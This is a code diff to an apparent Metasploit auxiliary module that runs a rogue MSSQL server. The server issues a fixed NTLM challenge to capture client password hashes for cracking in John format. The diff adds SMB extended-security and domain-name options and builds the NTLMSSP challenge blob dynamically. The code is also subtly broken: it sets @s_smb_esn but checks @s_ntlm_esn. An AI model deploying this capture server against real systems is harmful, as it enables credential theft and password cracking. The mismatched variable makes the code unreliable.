@@ -58,6 +58,13 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
 				OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])
 			], self.class)
+			
+			register_advanced_options(
+				[
+					OptBool.new("SMB_EXTENDED_SECURITY", [ true, "Use smb extended security negociation, when set client will use ntlmssp, if not then client will use classic lanman authentification", false ]),
+					OptString.new('DOMAIN_NAME',         [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
+				], self.class)
+			
 	end
 
 	def setup
@@ -66,6 +73,8 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
+		@s_smb_esn = datastore['SMB_EXTENDED_SECURITY']
+		@domain_name = datastore['DOMAIN_NAME']
 		if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/
 			@challenge = [ datastore['CHALLENGE'] ].pack("H*")
 		else
@@ -455,24 +464,35 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def mssql_send_ntlm_challenge(c, info)
+		win_domain = Rex::Text.to_unicode(@domain_name.upcase)
+		win_name = Rex::Text.to_unicode(@domain_name.upcase)
+		dns_domain = Rex::Text.to_unicode(@domain_name.downcase)
+		dns_name = Rex::Text.to_unicode(@domain_name.downcase)
+
+		if @s_ntlm_esn
+			sb_flag = 0xe28a8215 # ntlm2
+		else
+			sb_flag = 0xe2828215 #no ntlm2
+		end
+
+		securityblob = NTLM_UTILS::make_ntlmssp_blob_chall( win_domain,
+			win_name,
+			dns_domain,
+			dns_name,
+			@challenge,
+			sb_flag)
+
 		data = [
 			Constants::TDS_MSG_RESPONSE,
 			1, # status
-			0x0043, # length
+			11 + securityblob.length, # length
 			0x0000, # channel
 			0x01,   # packetno
 			0x00,   # window
 			Constants::TDS_TOKEN_AUTH,   # token: authentication
-			0x0038, # length
-			"NTLMSSP",
-			2, # NTLMSSP_CHALLENGE
-			"0000000038000000", # Target name: NULL
-			0x02008201, #flags
-			@challenge, # NTLM Challenge: 1122334455667788
-			"0000000000000000", # reserved
-			"0000000038000000", # Target Info List: Empty
-			"0502ce0e0000000f"  # Version: 5.2, Build: 3790, NTLM Revision: 15
-		].pack("CCnnCCCvZ*VH*VA*H*H*H*")
+			securityblob.length, # length
+			securityblob
+		].pack("CCnnCCCvA*")
 		c.put data
 	end
 
